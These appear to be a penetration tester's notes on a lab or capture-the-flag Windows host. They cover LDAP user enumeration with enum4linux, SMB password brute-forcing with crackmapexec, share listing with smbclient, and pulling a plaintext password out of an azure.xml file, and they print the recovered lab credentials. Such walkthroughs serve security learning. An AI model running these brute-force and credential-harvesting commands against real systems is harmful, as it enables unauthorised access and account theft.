# LDAP
---
- Using `enum4linux`, we can find ldap users:
	- `enum4linux 10.10.10.172`
	- ![[Pasted image 20250425134545.png]]

# Bruteforcing SMB
---
- Tried `ESREP-Roasting`but nothing found and there were no web servers or anything else on the server.
- But since we had list of users, tried bruteforcing it with the custom generated password list `osint_gen.py`
- Bruteforce using `crackmapexec`:
	- ` crackmapexec smb 10.10.10.172 -u users_small.txt  -p osint_output/passwords.txt`
	- ![[Pasted image 20250425144324.png]]
	- `SABatchJobs` : `SABatchJobs`
# SMB
---
- We have credentials of `SABatchJobs`, so we can list the shares:
	- ` smbclient -L \\\\10.10.10.172\\ -U SABatchJobs`
	- ![[Pasted image 20250425144425.png]]

- **users$**
---
	- `smbclient  \\\\10.10.10.172\\users$ -U SABatchJobs`
	- `recurse true`
	- `ls`
		![[Pasted image 20250425150013.png]]
	- `get mhope\azure.xml`
		![[Pasted image 20250425150058.png]]
		`mhope` : `4n0therD4y@n0th3r$`
- ==`azure_uploads` was empty==